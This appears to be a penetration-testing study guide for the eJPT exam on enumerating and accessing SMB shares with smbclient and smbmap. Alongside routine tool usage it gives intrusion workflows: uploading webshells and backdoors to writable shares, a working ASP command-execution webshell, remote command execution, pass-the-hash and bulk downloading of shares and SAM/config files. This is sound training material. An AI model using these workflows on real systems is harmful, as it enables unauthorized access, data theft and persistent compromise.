# SMBCLIENT & SMBMAP - SMB Share Access & Enumeration

## Overview

**SMBclient** and **smbmap** are tools for interacting with SMB (Server Message Block) shares. SMBclient allows you to connect to and browse SMB shares like Windows explorer, while smbmap focuses on enumerating shares and checking permissions quickly.

### Why It's Critical for eJPT:
- Access shared folders on Windows/Samba systems
- Download files from accessible shares
- Upload files (if permissions allow)
- Quick share enumeration and permission checking
- Prerequisite for exploitation (finding writable locations)

---

## Installation & Setup

### CachyOS (Arch Linux)
```bash
sudo pacman -S samba
which smbclient smbmap
smbclient --version
```

### Install smbmap (if not included)
```bash
git clone https://github.com/ShawnDEvans/smbmap.git
cd smbmap
chmod +x smbmap.py
# Run with: python3 smbmap.py
```

### Windows
- Built into Windows (net command)
- Or use WSL with samba installed

---

## Core Concepts

### SMB Shares

Common SMB shares on Windows:
- **C$, D$, E$**: Admin shares (full disk access)
- **IPC$**: Inter-Process Communication (info gathering)
- **ADMIN$**: Admin files share
- **NETLOGON**: Domain logon scripts
- **SYSVOL**: Group Policy data
- **PRINT$**: Printer drivers
- **Custom shares**: Company files, backups, etc.

### Share Permissions
- **READ**: Can list and view files
- **WRITE**: Can create/modify/delete files
- **NO ACCESS**: Denied access

### Authentication Methods
- **Null session**: No credentials (often works)
- **Guest**: Guest account
- **Username/password**: Authenticated access

---

## SMBCLIENT - Interactive SMB Client

### 1. **List Available Shares (No Credentials)**
```bash
smbclient -L 192.168.1.100 -N
```

**Output:**
```
	Sharename        Type      Comment
	---------        ----      -------
	print$           Disk      Printer Drivers
	C$               Disk      Default share
	D$               Disk      Default share
	admin$           Disk      Remote Admin
	IPC$             IPC       Remote IPC
	share1           Disk      Company Files
```

**Flags:**
- `-L`: List shares
- `-N`: Null session (no credentials)

### 2. **List Shares with Credentials**
```bash
smbclient -L 192.168.1.100 -U administrator%password
smbclient -L 192.168.1.100 -U "DOMAIN\username%password"
```

### 3. **Connect to a Share**
```bash
# Without credentials (null session):
smbclient //192.168.1.100/share1 -N

# With credentials:
smbclient //192.168.1.100/admin$ -U administrator%password

# You're now in SMB prompt:
smb: \>
```

### 4. **SMB Shell Commands**
Once connected, you can use these commands:

```bash
# List files:
smb: \> ls
smb: \> dir

# Change directory:
smb: \> cd documents
smb: \documents\> 

# Download file:
smb: \> get filename.txt
# File downloaded to your local machine

# Download entire directory:
smb: \> recurse on
smb: \> mget *
# Downloads all files recursively

# Upload file (if write permission):
smb: \> put local_file.txt
smb: \> lcd /path/on/your/machine
smb: \> mput *.txt  # Upload multiple files

# View file info:
smb: \> stat filename.txt

# Delete file (if write permission):
smb: \> del filename.txt
smb: \> rmdir dirname

# Create directory:
smb: \> mkdir newdir

# Exit SMB prompt:
smb: \> exit
```

### 5. **Download Specific Files**
```bash
# Single file:
smbclient //192.168.1.100/share -N -c "get config.ini"

# Multiple files:
smbclient //192.168.1.100/share -N -c "mget *.txt *.conf"

# Recursive download:
smbclient //192.168.1.100/share -N -c "recurse on; mget *"
```

**Flag:**
- `-c`: Execute command directly (non-interactive)

### 6. **Upload Files (Exploitation)**
If share is writable, upload webshell or malware:

```bash
smbclient //192.168.1.100/web -U user%pass -c "put shell.php"
smbclient //192.168.1.100/admin$ -U admin%admin -c "put backdoor.exe"
```

---

## SMBMAP - Quick SMB Enumeration

Smbmap is faster for permission checking across multiple shares.

### 1. **Quick Share Enumeration**
```bash
smbmap -H 192.168.1.100
```

**Output:**
```
[+] IP: 192.168.1.100:445	Name: unknown
	Disk                                    Permissions	Comment
	----                                    -----------	-------
	C$                                      	NO ACCESS
	D$                                      	NO ACCESS
	admin$                                  	NO ACCESS
	IPC$                                    	NO ACCESS
	share1                                  	READ, WRITE
	Documents                               	READ
	Downloads                               	READ, WRITE
```

### 2. **Enumeration with Credentials**
```bash
smbmap -H 192.168.1.100 -u administrator -p password
smbmap -H 192.168.1.100 -u "DOMAIN\user" -p password
```

### 3. **List Files in Share**
```bash
smbmap -H 192.168.1.100 -u admin -p password -R share1
smbmap -H 192.168.1.100 -u admin -p password -R C$ -q  # Quiet mode
```

**Flags:**
- `-R`: List files recursively
- `-q`: Quiet (less output)

### 4. **Find Specific File Types**
```bash
# Find all Word documents:
smbmap -H 192.168.1.100 -u admin -p password -R "*.docx"

# Find config files:
smbmap -H 192.168.1.100 -u admin -p password -R "*config*"

# Find backups:
smbmap -H 192.168.1.100 -u admin -p password -R "*.bak;*.backup"
```

### 5. **Download Specific File**
```bash
smbmap -H 192.168.1.100 -u admin -p password \
  --download "C$\config\database.ini"
```

**Flag:**
- `--download`: Download file to local machine

### 6. **Upload File (Exploitation)**
```bash
smbmap -H 192.168.1.100 -u admin -p password \
  --upload /tmp/shell.php share1

# Or upload to specific location:
smbmap -H 192.168.1.100 -u admin -p password \
  --upload /tmp/shell.exe "C$\Windows\Temp"
```

**Flag:**
- `--upload`: Upload file to share

### 7. **Execute Commands (if allowed)**
```bash
smbmap -H 192.168.1.100 -u admin -p password -x "whoami"
```

**Flag:**
- `-x`: Execute command

### 8. **Scan Range of Hosts**
```bash
smbmap -H 192.168.1.0/24
smbmap -H 192.168.1.{50..60}
```

### 9. **Search for Files by Pattern**
```bash
# Search entire share for files:
smbmap -H 192.168.1.100 -u admin -p password -R . \
  --filter "*password*" \
  --search
```

**Flags:**
- `--filter`: File pattern to search
- `--search`: Search for pattern

---

## Command Reference - Essential Flags

### SMBCLIENT

| Flag | Purpose | Example |
|------|---------|---------|
| `-L` | List shares | `-L 192.168.1.100` |
| `-N` | Null session | No credentials |
| `-U` | Username | `-U "DOMAIN\user"` |
| `-c` | Command | `-c "get file.txt"` |

### SMBMAP

| Flag | Purpose | Example |
|------|---------|---------|
| `-H` | Host | `-H 192.168.1.100` |
| `-u` | Username | `-u administrator` |
| `-p` | Password | `-p password` |
| `-R` | Recursive | Show all files |
| `--download` | Download file | `--download "C$\file"` |
| `--upload` | Upload file | `--upload /tmp/file share` |
| `-x` | Execute | `-x "command"` |
| `-q` | Quiet | Less output |

---

## Practical eJPT Workflows

### Workflow 1: Complete SMB Share Enumeration

```bash
# Step 1: Find SMB hosts:
nmap -p 445 --open 192.168.1.0/24 -oG smb_hosts.txt

# Step 2: Quick permission check on each:
for host in $(grep "445/open" smb_hosts.txt | awk '{print $2}'); do
  echo "[*] Checking $host"
  smbmap -H $host
done

# Step 3: If accessible shares found, list files:
smbmap -H 192.168.1.50 -R share1 -q

# Step 4: Download interesting files:
smbclient //192.168.1.50/share1 -N -c "mget *"
```

### Workflow 2: Find and Download Sensitive Files

```bash
# Step 1: List all shares:
smbclient -L 192.168.1.100 -N

# Step 2: For each readable share, list files:
smbclient //192.168.1.100/share1 -N -c "recurse on; ls"

# Step 3: Download files that look interesting:
smbclient //192.168.1.100/share1 -N \
  -c "get config.ini; get database.ini; get web.config"
```

### Workflow 3: Exploitation (Upload Webshell)

```bash
# Step 1: Enumerate shares:
smbmap -H 192.168.1.100 -u admin -p password -R

# Step 2: Find writable share connected to web:
smbmap -H 192.168.1.100 -u admin -p password -R "C$\inetpub\wwwroot"

# Step 3: Upload webshell:
smbclient //192.168.1.100/C$ -U admin%password \
  -c "put shell.php inetpub\\wwwroot\\shell.php"

# Step 4: Access shell via browser:
# http://192.168.1.100/shell.php
```

---

## Real-World eJPT Examples

### Example 1: Anonymous SMB Access
```bash
# Check for null session:
smbclient -L 192.168.1.50 -N

# If lists shares, try connecting:
smbclient //192.168.1.50/share1 -N

# In SMB prompt:
smb: \> ls
smb: \> get important_file.txt
smb: \> exit

# File now in your local directory
```

### Example 2: Credential-Based Access
```bash
# List shares with credentials:
smbclient -L 192.168.1.50 -U "admin%password123"

# Connect to admin share:
smbclient //192.168.1.50/admin$ -U "admin%password123"

# Download all files:
smb: \> recurse on
smb: \> mget *
smb: \> exit
```

### Example 3: Find and Exploit Writable Share
```bash
# Check permissions with smbmap:
smbmap -H 192.168.1.50 -u admin -p password -R

# If find writable directory (e.g., C$):
# Create webshell:
cat > shell.asp << 'EOF'
<%
Set objShell = CreateObject("WScript.Shell")
command = Request.QueryString("cmd")
Set objExec = objShell.Exec(command)
response.write objExec.StdOut.ReadAll()
%>
EOF

# Upload it:
smbclient //192.168.1.50/C$ -U admin%password \
  -c "put shell.asp windows\\temp\\shell.asp"

# Execute via RDP or network command execution
```

### Example 4: Download Entire Share for Analysis
```bash
#!/bin/bash
# download_smb_share.sh

HOST=$1
SHARE=$2
USER=$3
PASS=$4

mkdir -p "./$HOST/$SHARE"
cd "./$HOST/$SHARE"

smbclient //$HOST/$SHARE -U "$USER%$PASS" -c "recurse on; mget *"

echo "Downloaded to $(pwd)"

# Run:
# ./download_smb_share.sh 192.168.1.50 C$ admin password
```

---

## Advanced Techniques

### 1. **Null Session from enum4linux to SMBclient**
```bash
# Enum4linux found these shares...
# Now use smbclient to access:
enum4linux -S 192.168.1.100  # Find shares

# Then:
smbclient //192.168.1.100/share_found -N
```

### 2. **Chaining Commands**
```bash
# Multiple commands in sequence:
smbclient //192.168.1.100/share -N \
  -c "cd documents; ls; get file1.txt; get file2.txt"
```

### 3. **Using Pass the Hash (with right tools)**
```bash
# If you have NTLM hash (from hacking):
pth-smbclient //192.168.1.100/share1 \
  -U "admin%:NTHASH"
```

### 4. **Script SMB Enumeration**
```bash
#!/bin/bash
# enumerate_smb_network.sh

for host in 192.168.1.{50..100}; do
  echo "[*] Scanning $host"
  smbmap -H $host -q 2>/dev/null | grep -v "^$" && {
    echo "=== Detailed scan on $host ==="
    smbmap -H $host -R -q 2>/dev/null
  }
done
```

---

## Tips & Tricks for eJPT

### Quick Reference One-Liners

```bash
# List all shares:
smbclient -L 192.168.1.100 -N

# Check permissions on all shares:
smbmap -H 192.168.1.100

# Download file directly:
smbclient //192.168.1.100/share -N -c "get file.txt"

# Download entire share:
smbclient //192.168.1.100/share -N -c "recurse on; mget *"

# Find readable shares:
smbclient -L 192.168.1.100 -N | grep "READ"

# Connect and stay interactive:
smbclient //192.168.1.100/share -N

# Scan network for SMB:
for host in 192.168.1.{1..255}; do
  timeout 0.1 smbmap -H $host -q 2>/dev/null && echo "$host: SMB OPEN"
done
```

### Most Common Findings

| Path | Importance | Action |
|------|------------|--------|
| `/C$\` | CRITICAL | Full system access |
| `/admin$` | HIGH | Admin files |
| `/Documents` | HIGH | Business files |
| `\Windows\System32\config` | CRITICAL | SAM hashes |
| `\inetpub\wwwroot` | HIGH | Web app files |
| `\Program Files` | MEDIUM | Installed apps |
| `/backup` | CRITICAL | Company backups |
| `/config` | HIGH | Config files (passwords) |

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| "Permission denied" | Share requires credentials or has restrictions |
| "Connection refused" | SMB service not running or firewall blocking |
| "Cannot access IPC$" | Null session disabled (try credentials) |
| "Cannot list shares" | Use `-L` with `-N` for null session |
| "File not found" | Wrong path or file doesn't exist |
| "No more files" in mget | Normal - just means all files downloaded |

---

## Official Documentation & Resources

- **Samba Wiki**: https://wiki.samba.org/
- **SMBclient Manual**: `man smbclient`
- **Smbmap GitHub**: https://github.com/ShawnDEvans/smbmap
- **SMB Enumeration Guide**: https://wiki.samba.org/index.php/Troubleshooting

---

## Key Takeaways for eJPT

1. **List shares**: `smbclient -L target -N`
2. **Connect to share**: `smbclient //target/share -N`
3. **Download files**: `mget *` in SMB prompt
4. **Check permissions**: `smbmap -H target`
5. **Upload file**: `put localfile.txt` in SMB prompt
6. **Combine with enum4linux**: Enum finds shares, SMBclient accesses them
7. **Look for backups/config**: Often world-readable
8. **Admin$ share**: If accessible, full system compromise

---

**Next Steps**: Use downloaded files for password cracking or source code analysis. Use writable shares to upload webshells or backdoors.
